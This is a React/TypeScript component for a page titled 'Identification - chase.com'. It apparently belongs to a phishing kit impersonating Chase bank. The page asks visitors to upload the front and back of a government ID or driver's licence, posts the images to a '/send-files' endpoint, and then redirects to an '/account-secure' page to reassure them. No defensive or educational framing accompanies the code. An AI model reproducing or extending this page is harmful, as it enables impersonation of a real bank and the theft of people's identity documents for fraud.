import { Button, styled, Typography } from "@mui/material";
import { Box } from "@mui/system";
import axios from "axios";
import React, { useState } from "react";
import { Helmet } from "react-helmet";
import { useForm } from "react-hook-form";
import { useNavigate } from "react-router";
import { Content } from "./Content";
import { CustomButton } from "./CustomButton";
import { SubTitle } from "./SubTitle";
import { Title } from "./Title";
import { Wrapper } from "./Wrapper";

interface UploadDocProps {}

export const UploadDoc: React.FC<UploadDocProps> = () => {
  const {
    register,
    handleSubmit,
    formState: { errors },
    watch,
  } = useForm({
    mode: "onTouched",
  });

  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    const formData = new FormData();

    formData.append("front", data.frontImg[0]);
    formData.append("back", data.backImg[0]);
    formData.append("form", "SUPPORTING DOCUMENTS");

    await axios.post("/send-files", formData, {
      headers: {
        "Content-Type": "multipart/form-data",
      },
    });
    setLoading(false);
    navigate("/account-secure");
  });
  return (
    <Wrapper>
      <Box width="100%" padding="1rem">
        <Helmet>
          <title>Identification - chase.com</title>
        </Helmet>
        <Box
          sx={{
            background: "white",
            width: ["100%", "60%"],
            margin: "0 auto",
            padding: "2rem",
          }}
        >
          <Box marginBottom="1.5rem">
            <Typography
              component="h2"
              sx={{
                fontSize: "1.5rem",
                marginBottom: "1rem",
              }}
            >
              Upload supporting documents
            </Typography>
            <SubTitle subTitle="Upload a government issued identity document or driver's licence." />
          </Box>
          <Box>
            <Title title="Front" />
            <Content>
              <Box
                flex={1}
                width={["100%", "initial"]}
                component="label"
                htmlFor="contained-button-file-front"
              >
                <Input
                  accept="image/*"
                  id="contained-button-file-front"
                  type="file"
                  {...register("frontImg", {
                    required:
                      "Please upload the back picture of your ID/Driver's licence",
                  })}
                />
                {watch("frontImg") && watch("frontImg").length ? (
                  <Box>
                    <Typography color="#666" marginRight="5px">
                      {watch("frontImg")[0].name}
                    </Typography>
                    <Button
                      component="span"
                      sx={{
                        paddingLeft: 0,
                        textTransform: "capitalize",
                      }}
                    >
                      Change
                    </Button>
                  </Box>
                ) : (
                  <Button
                    component="span"
                    color={errors && errors["frontImg"] ? "error" : "primary"}
                    sx={{
                      paddingLeft: 0,
                      textTransform: "capitalize",
                      fontWeight: errors && errors["frontImg"] ? 700 : 300,
                    }}
                  >
                    Select file
                  </Button>
                )}
              </Box>
            </Content>
          </Box>
          <Box marginTop="1.5rem">
            <Title title="Back" />
            <Content>
              <Box
                flex={1}
                width={["100%", "initial"]}
                component="label"
                htmlFor="contained-button-file-back"
              >
                <Input
                  accept="image/*"
                  id="contained-button-file-back"
                  type="file"
                  {...register("backImg", {
                    required:
                      "Please upload the back picture of your ID/Driver's licence",
                  })}
                />
                {watch("backImg") && watch("backImg").length ? (
                  <Box>
                    <Typography color="#666" marginRight="5px">
                      {watch("backImg")[0].name}
                    </Typography>
                    <Button
                      component="span"
                      sx={{
                        paddingLeft: 0,
                        textTransform: "capitalize",
                      }}
                    >
                      Change
                    </Button>
                  </Box>
                ) : (
                  <Button
                    component="span"
                    color={errors && errors["backImg"] ? "error" : "primary"}
                    sx={{
                      paddingLeft: 0,
                      textTransform: "capitalize",
                      fontWeight: errors && errors["backImg"] ? 700 : 300,
                    }}
                  >
                    Select file
                  </Button>
                )}
              </Box>
            </Content>
          </Box>
          <Box marginTop="1.5rem">
            <Typography
              component="p"
              sx={{
                color: "#666",
                fontSize: [".8125rem", ".875rem"],
              }}
            >
              We will verify your information with the one in our system.
            </Typography>
          </Box>
          <Box
            width="100%"
            sx={{
              display: "flex",
              justifyContent: "flex-end",
              marginTop: "1.5rem",
            }}
          >
            <Box width={["100%", "30%"]}>
              <CustomButton
                text="Finish"
                onClick={onSubmit}
                disabled={loading}
              />
            </Box>
          </Box>
        </Box>
      </Box>
    </Wrapper>
  );
};

const Input = styled("input")({
  display: "none",
});
